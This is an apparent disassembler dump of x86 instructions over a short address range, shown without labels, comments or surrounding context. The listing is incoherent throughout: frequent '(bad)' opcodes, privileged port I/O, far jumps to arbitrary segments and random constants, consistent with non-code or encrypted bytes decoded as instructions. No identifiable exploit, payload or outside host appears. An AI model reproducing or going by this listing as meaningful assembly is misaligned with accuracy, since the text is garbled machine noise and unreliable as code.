  423dd9:	add    DWORD PTR ds:0x76eedee4,edx
  423ddf:	loop   0x423ded
  423de1:	scas   eax,DWORD PTR es:[edi]
  423de2:	cli    
  423de3:	mov    ?,WORD PTR [edx-0x496ce01b]
  423de9:	(bad)  
  423deb:	cdq    
  423dec:	popf   
  423ded:	or     esi,ecx
  423def:	call   0x19f29edb
  423df4:	mov    al,ds:0x4aa26998
  423df9:	push   ss
  423dfa:	sub    DWORD PTR [esi],esp
  423dfc:	data16 fild QWORD PTR [esi+0x3c]
  423e00:	adc    al,BYTE PTR [ebx-0x109bee8a]
  423e06:	cmp    DWORD PTR [edi-0x67],edi
  423e09:	jmp    0x423e78
  423e0b:	inc    ebx
  423e0c:	nop
  423e0d:	aas    
  423e0e:	jle    0x423dc3
  423e10:	inc    esp
  423e11:	jge    0x423de5
  423e13:	call   0x281b:0x57445f7f
  423e1a:	gs (bad) 
  423e1c:	bound  edx,QWORD PTR [esi+0x128dfe4c]
  423e22:	loopne 0x423e7f
  423e24:	mov    WORD PTR [ecx],ds
  423e26:	rcl    DWORD PTR [edx-0x47],0xcb
  423e2a:	mov    ebx,0x922958ea
  423e2f:	mov    dl,0xa6
  423e31:	fcomip st,st(5)
  423e33:	or     edi,DWORD PTR ds:[edi-0x25a9cfc2]
  423e3a:	test   BYTE PTR [ecx-0x424ac6ea],dh
  423e40:	stos   DWORD PTR es:[edi],eax
  423e41:	push   eax
  423e42:	jge    0x423e6e
  423e44:	xchg   edx,eax
  423e45:	jmp    0x423e50
  423e47:	or     eax,0xa51bf75d
  423e4c:	adc    ebp,0xffffffbc
  423e4f:	out    dx,al
  423e50:	cld    
  423e51:	mov    ebp,0x1b1924f7
  423e56:	pop    ebx
  423e57:	jecxz  0x423e18
  423e59:	and    esp,0xcd4bae9a
  423e5f:	xchg   ebp,eax
  423e60:	stos   BYTE PTR es:[edi],al
  423e61:	loopne 0x423e42
  423e63:	jmp    0x423e77
  423e65:	nop
  423e66:	jl     0x423ede
  423e68:	mov    ecx,0x99233408
  423e6d:	jmp    0x10c2:0x235f997
  423e74:	cld    
  423e75:	bound  edx,QWORD PTR [edx-0x7]
  423e78:	sub    DWORD PTR [edx],0x647a32c2
  423e7e:	ror    DWORD PTR [esi+0x1d],1
  423e81:	(bad)  
  423e82:	icebp  
  423e83:	push   ds
  423e84:	cld    
  423e85:	cwde   
  423e86:	mov    DWORD PTR [esi+0x31],edx
  423e89:	mov    eax,ds:0xa019efdd
  423e8e:	add    DWORD PTR [ebp+0x78],esi
  423e91:	jbe    0x423ede
  423e93:	sbb    DWORD PTR [ebx+0x38b4595d],edx
  423e99:	sub    DWORD PTR [edi-0x55fb06],ebp
  423e9f:	mov    cl,0xc7
  423ea1:	ror    DWORD PTR [edi+0xd],1
  423ea4:	pop    esi
  423ea5:	cwde   
  423ea6:	mov    al,ds:0xc6ca305a
  423eab:	mov    ebp,0x31f10e21
  423eb0:	in     al,dx
  423eb1:	cld    
  423eb2:	mov    bh,0xe4
  423eb4:	ds xor eax,0x90543d6c
  423eba:	add    BYTE PTR cs:[ebx-0x2e],0xc5
  423ebf:	inc    esi
  423ec0:	sub    eax,0xa0121dc
  423ec5:	shl    DWORD PTR [ebx+ebp*1],cl
  423ec8:	push   0xffffffe1
  423eca:	aam    0x9
  423ecc:	jae    0x423edd
  423ece:	fistp  QWORD PTR [eax+0x51570d72]
  423ed4:	xor    bh,BYTE PTR [eax-0x31]
  423ed7:	mov    edi,0xa68d31a6
  423edc:	hlt    
  423edd:	dec    esi
  423ede:	pushf  
  423edf:	outs   dx,BYTE PTR ds:[esi]
  423ee0:	in     al,0x75
  423ee2:	push   eax
  423ee3:	cmp    ecx,DWORD PTR [esi+0xf86df54]
  423ee9:	inc    BYTE PTR [esi]
  423eeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423eec:	xor    esp,esi
  423eee:	outs   dx,DWORD PTR ds:[esi]
  423eef:	lock imul edx,DWORD PTR [ebx],0xa11b9595
  423ef6:	js     0x423f5f
  423ef8:	add    eax,0x972311f0
  423efd:	adc    DWORD PTR [ebp-0x43],ebp
  423f00:	sub    bh,BYTE PTR [edi-0x18]
  423f03:	push   edx
  423f04:	xchg   edx,eax
  423f05:	sub    eax,0xcfd80ac
  423f0a:	stos   BYTE PTR es:[edi],al
  423f0b:	(bad)  
  423f0c:	and    al,0xba
  423f0e:	and    cl,BYTE PTR [edx]
  423f10:	xchg   BYTE PTR [esi],ch
  423f12:	loope  0x423f68
  423f14:	repz fmul DWORD PTR [eax]
  423f17:	retf   
  423f18:	mov    al,0x98
  423f1a:	neg    DWORD PTR [edi+0x19]
  423f1d:	mov    edi,0xb64abf4c
  423f22:	mov    edx,0xd8017045
  423f27:	jae    0x423f89
  423f29:	retf   
  423f2a:	sub    edi,DWORD PTR [eax+eax*2+0x15854f2b]
  423f31:	xchg   BYTE PTR [edi+eax*2+0x33],cl
  423f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f36:	mov    dl,0xf0
  423f38:	dec    esi
  423f39:	(bad)  
  423f3a:	sbb    DWORD PTR [edx+0x47d5d25b],esi
  423f40:	sub    ebp,edi
  423f42:	xchg   esp,eax
  423f43:	fsubr  DWORD PTR [ebp+0x63]
  423f46:	sbb    al,0x96
  423f48:	iret   
  423f49:	push   esp
  423f4a:	mov    ds:0xb0c92cb6,al
  423f4f:	popa   
  423f50:	rol    BYTE PTR ds:0x91c90464,0xbd
  423f57:	add    bh,BYTE PTR [edi]
  423f59:	(bad)  
  423f5a:	loopne 0x423fa6
  423f5c:	jb     0x423f34
  423f5e:	fadd   DWORD PTR [edi]
  423f60:	mov    WORD PTR [edi],cs
  423f62:	in     eax,0xe2
  423f64:	pop    ebx
  423f65:	les    ebp,FWORD PTR [edx+0x6d]
  423f68:	in     eax,0x61
  423f6a:	jbe    0x423efa
  423f6c:	push   ebp
  423f6d:	in     eax,0x96
  423f6f:	dec    edi
  423f70:	lds    edx,FWORD PTR ds:[ecx+0x5398154a]
  423f77:	call   0x1cf63f97
  423f7c:	std    
  423f7d:	jb     0x423f71
  423f7f:	cdq    
  423f80:	add    ch,BYTE PTR [ebp-0x1708711c]
  423f86:	mul    DWORD PTR [ebp-0x2f]
  423f89:	inc    edx
  423f8a:	xor    BYTE PTR [edx-0xd],cl
  423f8d:	push   es
  423f8e:	add    eax,DWORD PTR [ecx+0x50]
  423f91:	ja     0x423fb9
  423f93:	loop   0x423fb0
  423f95:	mov    cl,0x42
  423f97:	gs fs jne 0x424009
  423f9b:	and    BYTE PTR [ebx-0x24],al
  423f9e:	and    eax,0x9ec8d644
  423fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fa4:	mov    cl,0x9a
  423fa6:	jle    0x423fcc
  423fa8:	jae    0x424020
  423faa:	or     ecx,DWORD PTR [edi+ecx*1-0x38]
  423fae:	sub    eax,0x6f33d193
  423fb3:	sub    dl,BYTE PTR [ecx]
  423fb5:	jg     0x423f5e
  423fb7:	and    BYTE PTR [eax+0x5ccb2054],cl
  423fbd:	sub    ah,dh
  423fbf:	xor    al,0x3e
  423fc1:	jnp    0x423f7c
  423fc3:	add    DWORD PTR [esi-0x28e331cb],0xffffffdf
  423fca:	call   0x7b57:0xc78d8553
  423fd1:	adc    al,0xc
  423fd3:	leave  
  423fd4:	mov    al,ds:0xe20fbbcc
  423fd9:	jp     0x42405a
  423fdb:	fist   WORD PTR [edi]
  423fdd:	lods   al,BYTE PTR ds:[esi]
  423fde:	ret    0x12d8
  423fe1:	aad    0xbb
  423fe3:	pop    ebx
  423fe4:	iret   
  423fe5:	cli    
  423fe6:	(bad)  
  423fe7:	push   esi
  423fe8:	int3   
  423fe9:	dec    esi
  423fea:	and    esi,eax
  423fec:	jnp    0x42405d
  423fee:	and    al,0x9c
  423ff0:	push   0xd
  423ff2:	(bad)  
  423ff3:	fsub   DWORD PTR [ecx]
  423ff5:	sbb    ebx,esi
  423ff7:	aam    0x80
  423ff9:	out    0xd4,al
  423ffb:	dec    edx
  423ffc:	repnz lds ecx,FWORD PTR [esi]
  423fff:	sub    eax,0xdeb0fa81
  424004:	and    ch,BYTE PTR [ebp-0x39]
  424007:	fbstp  TBYTE PTR [ebx+0x5c]
  42400a:	xor    eax,DWORD PTR [edi+0x11]
  42400d:	adc    BYTE PTR [ebx],cl
  42400f:	call   0x1598:0x739ff750
  424016:	cmp    BYTE PTR [edi+ebp*4+0x17a1ce0c],dh
  42401d:	pop    ds
  42401e:	push   0x5
  424020:	out    dx,eax
  424021:	and    ebp,DWORD PTR [eax-0x12]
  424024:	inc    edx
  424025:	je     0x42407b
  424027:	and    DWORD PTR [ecx+0x59bcbf31],ebx
  42402d:	and    bh,0x50
  424030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424031:	mov    DWORD PTR [edi-0x1d],esi
  424034:	addr16 xchg edx,eax
  424036:	xchg   ebp,eax
  424037:	hlt    
  424038:	and    bh,BYTE PTR [esi]
  42403a:	hlt    
  42403b:	das    
  42403c:	ds das 
  42403e:	rol    DWORD PTR [ebp-0x61],1
  424041:	adc    al,0x53
  424043:	push   esp
  424044:	mov    ecx,0x79f10845
  424049:	xchg   ebp,eax
  42404a:	mov    ds:0x8033a018,al
  42404f:	dec    edi
  424050:	adc    BYTE PTR [esi+edx*4],ah
  424053:	mov    ah,0x12
  424055:	jle    0x424017
  424057:	fwait
  424058:	loop   0x4240d8
  42405a:	xchg   DWORD PTR [ebp-0x7c16c8fd],esp
  424060:	popf   
  424061:	pop    ebp
  424062:	loope  0x424093
  424064:	jmp    0xed33:0x1c80af5
  42406b:	dec    eax
  42406c:	and    DWORD PTR [ecx],eax
  42406e:	and    al,0x68
  424070:	add    ecx,DWORD PTR [ebp+0x1]
  424073:	lock cmc 
  424075:	pop    edx
  424076:	xchg   edi,eax
  424077:	jp     0x4240d2
  424079:	and    DWORD PTR [ebp-0x2a636c03],edx
  42407f:	xchg   esp,eax
  424080:	fwait
  424081:	or     eax,0xe4ddf2fa
  424086:	xor    eax,0xaa5aaa6
  42408b:	(bad)  [eax-0x51]
  42408e:	aas    
  42408f:	mov    ds:0x4ddbf2d0,eax
  424094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424095:	push   edi
  424096:	inc    esp
  424097:	lea    esp,[eax]
  424099:	dec    esp
  42409a:	into   
  42409b:	mov    esi,DWORD PTR [edx+0x7ec69f4]
  4240a1:	leave  
  4240a2:	dec    esi
  4240a3:	inc    eax
  4240a4:	int3   
  4240a5:	pop    esp
  4240a6:	add    eax,0x9b0363e3
  4240ab:	jge    0x4240d9
  4240ad:	sub    al,0x45
  4240af:	mov    eax,DWORD PTR [ebp-0x5a6185e7]
  4240b5:	lods   al,BYTE PTR ds:[esi]
  4240b6:	mov    dh,0x63
  4240b8:	mov    ebx,0xcf7c208e
  4240bd:	and    BYTE PTR [ebp+0x17],0xa6
  4240c1:	sub    BYTE PTR [ecx],al
  4240c3:	xor    DWORD PTR [ebx],0x68
  4240c6:	or     eax,DWORD PTR [esi]
  4240c8:	sbb    BYTE PTR [ecx+0xa],al
  4240cb:	ss sbb eax,0xb29ffbc5
  4240d1:	arpl   WORD PTR [eax],ax
  4240d3:	pop    edx
  4240d4:	ins    BYTE PTR es:[edi],dx
  4240d5:	mov    ebx,0xfb8e8909
  4240da:	sti    
  4240db:	(bad)  
  4240dd:	rep stos DWORD PTR es:[edi],eax
  4240df:	retf   0x9bd0
  4240e2:	call   0xc8a5:0xd0e23a88
  4240e9:	jle    0x424130
  4240eb:	mov    ch,0x97
  4240ed:	xchg   ecx,eax
  4240ee:	in     eax,0x41
  4240f0:	or     DWORD PTR ds:[edi],edi
  4240f3:	and    al,0xd
  4240f5:	repz pop es
  4240f7:	in     eax,0xd8
  4240f9:	push   cs
  4240fa:	in     eax,0x12
  4240fc:	push   ebp
  4240fd:	sbb    dl,bl
  4240ff:	xor    al,0xf7
  424101:	fs cmp al,0xbe
  424104:	shl    ecx,1
  424106:	in     al,0x25
  424108:	ror    DWORD PTR [ecx-0x675310c1],0x8f
  42410f:	mov    edi,0x381d8ad0
  424114:	pushf  
  424115:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424116:	inc    ebp
  424117:	stc    
  424118:	pusha  
  424119:	cmp    al,0x6e
  42411b:	mov    esp,0x3e5d90bb
  424120:	aam    0x12
  424122:	and    DWORD PTR [ecx],0x49b48d78
  424128:	int3   
  424129:	push   es
  42412a:	shl    BYTE PTR [ebx-0x22],0x41
  42412e:	sbb    al,0x19
  424130:	adc    eax,0xb7c00f2c
  424135:	mov    eax,0x4c9dddba
  42413a:	dec    eax
  42413b:	xchg   esp,eax
  42413c:	pop    eax
  42413d:	sar    DWORD PTR [esi+0x40],1
  424140:	dec    esp
  424142:	and    eax,0x6727ebfc
  424147:	pop    ss
  424148:	popa   
  424149:	out    dx,eax
  42414a:	jnp    0x4240ed
  42414c:	dec    ebp
  42414d:	icebp  
  42414e:	adc    eax,0x7881fc6
  424153:	call   0xfd82:0xc8aef0f6
  42415a:	cmp    eax,0x7e5bb2ee
  42415f:	push   0x97dec533
  424164:	ja     0x424194
  424166:	(bad)  
  424167:	cmp    bl,bh
  424169:	pushf  
  42416a:	je     0x424123
  42416c:	shl    BYTE PTR [esi],cl
  42416e:	xor    BYTE PTR [edi],bh
  424170:	or     eax,0x221e9f53
  424175:	xor    eax,0x55ec1590
  42417a:	fidiv  WORD PTR [esi+0x1d]
  42417d:	int    0xf5
  42417f:	std    
  424180:	mov    cs,edx
  424182:	inc    DWORD PTR [edx+0x53]
  424185:	cdq    
  424186:	cs push eax
  424188:	repnz outs dx,DWORD PTR ds:[esi]
  42418a:	push   ecx
  42418b:	xor    DWORD PTR [ebp-0x16],ebp
  42418e:	adc    al,0x4a
  424190:	push   eax
  424191:	es pop edi
  424193:	mov    bl,0xb8
  424195:	je     0x424150
  424197:	outs   dx,BYTE PTR ds:[esi]
  424198:	scas   al,BYTE PTR es:[edi]
  424199:	jno    0x4241a7
  42419b:	std    
  42419c:	xor    eax,esp
  42419e:	test   DWORD PTR [esi+0x5f049003],esi
  4241a4:	xchg   BYTE PTR [eax+0x66],al
  4241a7:	add    ch,BYTE PTR [ecx-0x7859f898]
  4241ad:	pop    esi
  4241ae:	hlt    
  4241af:	mov    ecx,edi
  4241b1:	push   es
  4241b2:	add    DWORD PTR [edi-0x701e8858],ebp
  4241b8:	jge    0x42421a
  4241ba:	cmp    cl,BYTE PTR [ebx-0x7c78360e]
  4241c0:	in     eax,dx
  4241c1:	call   0x82fd2cda
  4241c6:	mov    ch,0x32
  4241c8:	adc    edx,0xffffffeb
  4241cb:	jmp    0xa296f385
  4241d0:	in     al,dx
  4241d1:	and    BYTE PTR [eax],ah
  4241d3:	in     eax,dx
  4241d4:	aam    0x82
  4241d6:	outs   dx,BYTE PTR ds:[esi]
  4241d7:	dec    edx
  4241d8:	cdq    
  4241d9:	push   esp
  4241da:	retf   0x1a9b
  4241dd:	cmc    
  4241de:	aaa    
  4241df:	sub    ecx,ebx
  4241e1:	lods   al,BYTE PTR ds:[esi]
  4241e2:	loopne 0x4241ad
  4241e4:	or     ah,BYTE PTR [ebp+0x47871912]
  4241ea:	jae    0x424203
  4241ec:	in     al,dx
  4241ed:	imul   eax,eax,0xe9841121
  4241f3:	mov    dh,0xeb
  4241f5:	test   al,0x73
  4241f7:	push   edx
  4241f8:	stc    
  4241f9:	popa   
  4241fa:	and    eax,0x2b6d8257
  4241ff:	das    
  424200:	mov    dl,0x1c
  424202:	push   es
  424203:	in     al,0x56
  424205:	aad    0xe6
  424207:	pop    esi
  424208:	clc    
  424209:	xchg   ecx,eax
  42420a:	push   edi
  42420b:	fisub  DWORD PTR [edi-0x56]
  42420e:	or     esp,esp
  424210:	(bad)  
  424211:	mov    ch,0x47
  424213:	add    eax,0xa957127d
  424218:	or     ebx,esi
  42421a:	jno    0x4241b8
  42421c:	mov    ds:0xf025c3e3,eax
  424221:	push   esp
  424222:	not    BYTE PTR ds:0x4d2e5e65
  424228:	pusha  
  424229:	adc    eax,0xb439315a
  42422e:	jle    0x4241eb
  424230:	ficomp WORD PTR [ecx]
  424232:	sbb    dh,BYTE PTR [ebx+ecx*2+0x11]
  424236:	and    cx,dx
  424239:	push   edi
  42423a:	mov    esi,edx
  42423c:	(bad)  
  42423d:	enterw 0x4636,0xe3
  424242:	cmp    esp,DWORD PTR [ecx+ecx*1]
  424245:	aas    
  424246:	out    0x27,eax
  424248:	pop    esi
  424249:	mov    edi,0xe49544b1
  42424e:	xchg   BYTE PTR [esi+0x7fac90c2],bh
  424254:	xor    al,BYTE PTR [edx+0x8]
  424257:	cmp    DWORD PTR [edi+0x4e],ebp
  42425a:	or     eax,0xbded1032
  42425f:	mov    ebp,0x82bd9027
  424264:	imul   ebp,DWORD PTR [esi+0x67],0xd
  424268:	mov    dh,0xb5
  42426a:	or     DWORD PTR [ebx+ebx*2+0x4d],ebp
  42426e:	outs   dx,DWORD PTR ds:[esi]
  42426f:	inc    ebp
  424270:	cs (bad) 
  424272:	cli    
  424273:	add    BYTE PTR [eax],dl
  424275:	aas    
  424276:	sub    DWORD PTR [edi-0x2316624],eax
  42427c:	xor    al,0x69
  42427e:	bound  ecx,QWORD PTR [edi]
  424280:	lods   eax,DWORD PTR ds:[esi]
  424281:	shl    DWORD PTR [edi+ebx*2],cl
  424284:	inc    edi
  424285:	loopne 0x424290
  424287:	cld    
  424288:	add    al,0xa0
  42428a:	and    eax,0xe132fd62
  42428f:	cmp    BYTE PTR [edx+0x22669cb4],ch
  424295:	(bad)  
  424297:	mov    esi,0xe97947fe
  42429c:	mov    edx,0x3cb64ae2
  4242a1:	idiv   DWORD PTR [edx]
  4242a3:	adc    al,BYTE PTR [esi]
  4242a5:	fcmovb st,st(6)
  4242a7:	cmp    cl,BYTE PTR [ebp-0x3f43e4a4]
  4242ad:	push   ds
  4242ae:	mov    al,BYTE PTR [edx+0x4a]
  4242b1:	test   BYTE PTR [edx+edi*2],ah
  4242b4:	add    ebx,DWORD PTR [edi+edx*8+0x30]
  4242b8:	ja     0x424334
  4242ba:	fcomp  QWORD PTR [ebx]
  4242bc:	pop    ebx
  4242bd:	stos   DWORD PTR es:[edi],eax
  4242be:	adc    DWORD PTR [eax-0xd4d2373],esp
  4242c4:	rol    BYTE PTR fs:[edi*4+0x7a52d285],0x60
  4242cd:	xor    DWORD PTR [edx],eax
  4242cf:	jmp    0xf2be:0x6f215428
  4242d6:	adc    dh,BYTE PTR [ebp-0x33]
  4242d9:	cld    
  4242da:	lods   al,BYTE PTR ds:[esi]
  4242db:	adc    al,0x9
  4242dd:	mov    ecx,0xf3fe3dad
  4242e2:	aad    0x80
  4242e4:	mov    ?,WORD PTR [edi+0x5b3884e3]
  4242ea:	fiadd  WORD PTR [edi-0x478ff8a9]
  4242f0:	sub    bl,0x71
  4242f3:	mov    dh,0x58
  4242f5:	dec    ebp
  4242f6:	out    dx,eax
  4242f7:	rol    DWORD PTR [edx+0x2f],1
  4242fa:	xchg   ebp,eax
  4242fb:	retf   
  4242fc:	pextrw edi,(bad),0xc5
  4242fe:	jns    0x4242e4
  424300:	push   edx
  424301:	outs   dx,DWORD PTR ds:[esi]
  424302:	imul   esi,DWORD PTR [ebx+0x2f],0xb4214743
  424309:	sbb    eax,0xd2bf201d
  42430e:	jl     0x42436c
  424310:	xchg   ecx,eax
  424311:	loope  0x42433c
  424313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424314:	movzx  ebp,WORD PTR [eax]
  424317:	fadd   QWORD PTR [edi]
  424319:	and    eax,0x272e9a6c
  42431e:	sbb    DWORD PTR [edx+ebx*2+0xa254d36],ecx
  424325:	xor    DWORD PTR fs:[eax-0x1fe6f926],ebp
  42432c:	cmp    edx,DWORD PTR [ebx-0x45918d54]
  424332:	ret    
  424333:	mov    ds:0x11f43b2a,al
  424338:	jne    0x424378
  42433a:	jns    0x42437d
  42433c:	mul    DWORD PTR [ebp-0x7d]
  42433f:	fstp   st(1)
  424341:	add    eax,0x90c38c99
  424346:	fcmove st,st(0)
  424348:	mov    eax,0x778ec9cd
  42434d:	ss loop 0x424341
  424350:	or     BYTE PTR [ebx-0x4],ch
  424353:	jg     0x424307
  424355:	outs   dx,BYTE PTR ds:[esi]
  424356:	clc    
  424357:	(bad)  
  424358:	ss push edi
  42435a:	xor    DWORD PTR [ecx],edx
  42435c:	lea    eax,[ebp-0x4b31071c]
  424362:	pop    esi
  424363:	jne    0x424358
  424365:	call   FWORD PTR [ebx+0x2c]
  424368:	xchg   ecx,eax
  424369:	jbe    0x4243b7
  42436b:	cld    
  42436c:	push   ds
  42436d:	ins    DWORD PTR es:[edi],dx
  42436e:	loop   0x424359
  424370:	mov    bl,0xa5
  424373:	adc    al,0x63
  424375:	fist   WORD PTR [ebx-0x3c6cf05b]
  42437b:	les    edx,FWORD PTR [esi+edi*1+0x4aa62628]
  424382:	jl     0x424323
  424384:	stc    
  424385:	sub    BYTE PTR [esi-0x75407deb],ch
  42438b:	inc    esp
  42438c:	retf   0x66ff
  42438f:	pop    ebp
  424390:	xlat   BYTE PTR ds:[ebx]
  424391:	stos   BYTE PTR es:[edi],al
  424392:	jmp    0x6b9ca8a6
  424397:	push   ss
  424398:	mov    edi,0xb541b6fa
  42439d:	test   eax,0x190c9f34
  4243a2:	inc    ebx
  4243a3:	in     eax,0x3e
  4243a5:	mov    dl,0xda
  4243a7:	push   ebx
  4243a8:	add    BYTE PTR [ecx-0x4a],ch
  4243ab:	pop    esp
  4243ac:	div    BYTE PTR [ecx+0x71cb70c8]
  4243b2:	ss (bad) 
  4243b4:	xchg   esi,eax
  4243b5:	je     0x42438e
  4243b7:	in     al,0x39
  4243b9:	xor    eax,0xf89d8a26
  4243be:	scas   eax,DWORD PTR es:[edi]
	...
  4243c7:	add    BYTE PTR [eax],al
  4243c9:	add    BYTE PTR [edx+0x44],bl
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424450
  4243d7:	pop    esp
  4243d8:	dec    edi
  4243d9:	ret    0xd1a9
  4243dc:	add    DWORD PTR [eax],eax
  4243de:	jge    0x4243e6
  4243e0:	add    BYTE PTR [eax],al
  4243e2:	adc    bh,BYTE PTR [eax]
  4243e4:	ja     0x4243fd
  4243e6:	push   ds
  4243e7:	mov    ss,WORD PTR [ecx-0x20ef311c]
  4243ed:	pop    ebx
  4243ee:	inc    esi
  4243ef:	dec    esi
  4243f0:	outs   dx,DWORD PTR ds:[esi]
  4243f1:	(bad)
  4243f4:	xor    BYTE PTR ds:0xc704d556,ch
  4243fa:	push   edx
  4243fb:	pop    edx
  4243fc:	daa    
  4243fd:	xlat   BYTE PTR ds:[ebx]
  4243fe:	mov    al,0x1e
  424400:	add    ah,al
  424402:	jns    0x4243b3
  424404:	xchg   edx,eax
  424405:	adc    eax,0xc7359b0a
  42440a:	aad    0xf7
  42440c:	pop    es
  42440d:	stc    
  42440e:	pop    es
  42440f:	or     ebp,DWORD PTR [ecx+0x3]
  424412:	ret    
  424413:	cli    
  424414:	pop    ss
  424415:	fst    QWORD PTR [ebp+0x32]
  424418:	jmp    0xafe3:0x12d39c4c
  42441f:	inc    edx
  424420:	das    
  424421:	sbb    ebx,0xffffffe9
  424424:	(bad)  
  424426:	jg     0x4243bb
  424428:	mov    ah,0xe4
  42442a:	xchg   edx,eax
  42442b:	sti    
  42442c:	sahf   
  42442d:	arpl   WORD PTR [ebx],bp
  42442f:	(bad)  [ebx-0x6b1dd39d]
  424435:	push   esp
  424436:	clc    
  424437:	sahf   
  424438:	sbb    bl,bh
  42443a:	cmp    BYTE PTR [eax],bl
  42443c:	dec    dh
  42443e:	je     0x4243fa
  424440:	mov    ch,0xcf
  424442:	xchg   esi,eax
  424443:	xchg   esp,eax
  424444:	adc    DWORD PTR [eax-0x6bf275a6],ecx
  42444a:	in     eax,0x82
  42444c:	ja     0x424474
  42444e:	dec    esi
  42444f:	push   edx
  424450:	lods   al,BYTE PTR ds:[esi]
  424451:	call   0xd3d7ee66
  424456:	mov    ss,WORD PTR [esp+ecx*4+0x6894f47]
  42445d:	push   ebp
  42445e:	dec    esi
  42445f:	rol    DWORD PTR [ebp+0x1689bb2a],0xb7
  424466:	push   0xffffffbf
  424468:	or     dh,BYTE PTR [esi+0x529550b0]
  42446e:	test   BYTE PTR [eax+eax*2],0x30
  424472:	adc    BYTE PTR [esi+0x1d796fc2],ch
  424478:	push   ebp
  424479:	inc    ebx
  42447a:	sti    
  42447b:	fcmovnb st,st(2)
  42447d:	and    DWORD PTR ds:0xcdff7532,esi
  424483:	push   eax
  424484:	daa    
  424485:	mov    dh,BYTE PTR [esi]
  424487:	scas   al,BYTE PTR es:[edi]
  424488:	xor    DWORD PTR [ebp+0x61f361db],ecx
  42448e:	mov    DWORD PTR ds:0xdf58a20a,eax
  424494:	(bad)  
  424495:	sub    eax,0xe82468c2
  42449a:	mov    eax,0x28527eda
  42449f:	or     BYTE PTR [ebx+0x4a218820],bh
  4244a5:	mov    cl,0x44
  4244a7:	pusha  
  4244a8:	mov    ebx,0x2a66f033
  4244ad:	and    DWORD PTR [edx+ebp*2+0x54],edx
  4244b1:	push   0x48e6db0a
  4244b6:	aas    
  4244b7:	or     ah,BYTE PTR [edi]
  4244b9:	mov    edi,0x132a04ae
  4244be:	mov    edi,0xafcfc1a4
  4244c3:	inc    edi
  4244c4:	loope  0x42446a
  4244c6:	mov    ecx,0x39b3bd20
  4244cb:	xor    eax,DWORD PTR [eax+0x57ff1336]
  4244d1:	jo     0x424489
  4244d3:	outs   dx,DWORD PTR ds:[esi]
  4244d4:	xor    cl,BYTE PTR [eax+0x47]
  4244d7:	(bad)  
  4244d8:	fptan  
  4244da:	sub    al,0x8c
  4244dc:	xchg   DWORD PTR [ebx-0x717944ff],ecx
  4244e2:	aas    
  4244e3:	jmp    0x424552
  4244e5:	xor    BYTE PTR [ecx-0x6c],cl
  4244e8:	bound  ebp,QWORD PTR [edx+eax*2-0x6d]
  4244ec:	pop    esp
  4244ed:	sub    ch,cl
  4244ef:	push   cs
  4244f0:	(bad)  
  4244f1:	out    dx,al
  4244f2:	mov    edx,0x1f4356e
  4244f7:	adc    eax,DWORD PTR ds:0xefb74621
  4244fd:	outs   dx,DWORD PTR ds:[esi]
  4244fe:	adc    BYTE PTR gs:[eax+0x6247c2c5],bh
  424505:	pop    ebp
  424506:	cmc    
  424507:	sub    BYTE PTR [ebp-0x1fa6f768],cl
  42450d:	mov    ah,0xc5
  42450f:	inc    edi
  424510:	mov    edi,0xa4b530a5
  424515:	popf   
  424516:	xor    DWORD PTR [eax+ebp*4+0x2517cb94],esi
  42451d:	xchg   DWORD PTR ds:0x2083e7be,edi
  424523:	cmp    BYTE PTR [ecx-0x1c],bl
  424526:	dec    ebx
  424527:	arpl   WORD PTR [ecx-0x5b],si
  42452a:	jne    0xda30de18
  424530:	fs jge 0x424553
  424533:	add    dl,BYTE PTR [eax+0x2b0593d6]
  424539:	and    ecx,DWORD PTR [ebx+edi*8]
  42453c:	addr16 push edx
  42453e:	pop    eax
  42453f:	pop    edi
  424540:	add    DWORD PTR [edx+0x25a25d82],0x1f
  424547:	rol    BYTE PTR [ebx+0x30],1
  42454a:	pop    ds
  42454b:	fild   QWORD PTR [edx]
  42454d:	inc    ebp
  42454e:	push   esi
  42454f:	shr    ebp,0xb6
  424552:	aam    0x3c
  424554:	adc    DWORD PTR [esi-0x74],ebp
  424557:	aas    
  424558:	add    DWORD PTR [ecx],edx
  42455a:	xor    dh,BYTE PTR [ebp+0x7a]
  42455d:	cdq    
  42455e:	or     BYTE PTR [ecx+0x32],0xab
  424562:	fsubr  st,st(3)
  424564:	sub    DWORD PTR [edx+0x2bbaaac9],esi
  42456a:	jne    0x4245bf
  42456c:	cmp    DWORD PTR [ecx-0x23],0x37
  424570:	retf   0x1246
  424573:	inc    edx
  424574:	dec    ebx
  424575:	dec    edi
  424576:	mov    esi,0x7b8908b5
  42457b:	in     al,0x8a
  42457d:	pop    edx
  42457e:	mov    al,0x6d
  424580:	mov    cs,WORD PTR [ebp+edi*8+0x1]
  424584:	xchg   esp,eax
  424585:	mov    DWORD PTR [eax+0xd],edx
  424588:	stos   BYTE PTR es:[edi],al
  424589:	sar    BYTE PTR [edi],cl
  42458b:	ret    
  42458c:	nop
  42458d:	(bad)  [ecx]
  42458f:	inc    eax
  424590:	jae    0x4245ef
  424592:	xchg   edx,eax
  424593:	jp     0x42452c
  424595:	inc    esi
  424596:	in     al,dx
  424597:	or     BYTE PTR [eax+0x44],ch
  42459a:	ja     0x42459d
  42459c:	mov    cl,0xa6
  42459e:	or     ah,ah
  4245a0:	sbb    eax,0xcd6784d9
  4245a5:	(bad)  
  4245a6:	push   0xa
  4245a8:	xor    edx,DWORD PTR [ecx]
  4245aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ab:	(bad)  
  4245ac:	jl     0x42456d
  4245ae:	jo     0x424581
  4245b0:	inc    ebp
  4245b1:	fmul   QWORD PTR [ebx]
  4245b3:	push   ebx
  4245b4:	or     al,0x1e
  4245b6:	inc    eax
  4245b7:	icebp  
  4245b8:	aad    0xaf
  4245ba:	js     0x4245e6
  4245bc:	pop    edx
  4245bd:	fwait
  4245be:	out    dx,eax
  4245bf:	std    
  4245c0:	stc    
  4245c1:	pop    esi
  4245c2:	dec    ebp
  4245c3:	sbb    dl,0x85
  4245c6:	mov    ecx,0xa4cf7a08
